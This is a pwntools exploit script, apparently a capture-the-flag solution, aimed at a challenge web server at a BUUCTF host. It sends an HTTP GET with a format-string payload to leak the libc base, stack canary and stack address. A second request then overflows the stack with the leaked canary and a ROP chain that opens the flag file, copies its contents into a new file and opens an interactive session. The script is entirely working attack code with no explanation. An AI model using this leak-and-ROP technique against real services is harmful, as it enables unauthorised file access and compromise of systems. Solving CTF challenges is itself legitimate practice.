from pwn import *
from ctypes import *

binary="./attachment"
context.binary=binary
context.log_level="debug"
ip="node5.buuoj.cn"
port=29269
elf = ELF(binary)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

s    =    lambda a              :io.send(a)
sl   =    lambda a              :io.sendline(a)
sa   =    lambda a,b            :io.sendafter(a,b)
sla  =    lambda a,b            :io.sendlineafter(a,b)
r    =    lambda a              :io.recv(a)
rl   =    lambda                :io.recvline()
ru   =    lambda a,b=True       :io.recvuntil(a,b)
se   =    lambda i              :str(i).encode()
lss  =    lambda s :log.success("[1;30;41m%s --> 0x%x [0m" % (s, eval(s)))

io = remote(ip, port)
s(b'GET /%159$p.%167$p.%170$p. ')
ru(b'0x')
base = int(ru(b'.'), 16) - 0x7f1aa
ru(b'0x')
canary = int(ru(b'.'), 16)
ru(b'0x')
stack = int(ru(b'.'), 16)
lss(b'base - '+hex(base).encode())
lss(b'canary - '+hex(canary).encode())
lss(b'stack - '+hex(stack).encode())
stack1 = stack+192
stack2 = stack+156
io.close()
io = remote(ip, port)
accept = base + libc.sym.accept
openn = base  + libc.sym.open
read = base + libc.sym.read
write = base + libc.sym.write
sendfile = base + libc.sym.sendfile
rdi = base + 0x2a3e5
rsi = base + 0x2be51
rdbx= base + 0x904a9
rcx = base + 0x3d1ee
payload =  b'GET /a.cgi?input='+b'flag\x00\x00\x00\x00'
payload += b'aaaa'+b'\x00'*52+p64(canary)*5
payload += flat(rdi, stack-0x260, rsi, 0, openn, rdi, stack-0x258, rsi, 0x241, rdbx, 0o777, 0, openn)
# open(flag, 0), fd=5
# open(aaaa, 0x241, 0o777), fd=6
payload += flat(rdi, 5, rsi, stack-0x100, rdbx, 0x100, 0, read)
# read(5, stack-0x100, 0x100)
payload += flat(rdi, 6, rsi, stack-0x100, rdbx, 0x100, 0, write)
# write(6, stack-0x100, 0x100) 
s(payload)
#io.close()
sleep(5)
#o = remote(ip, port)
#(b'GET /aaaa ')
#rint(io.recv())
io.interactive()
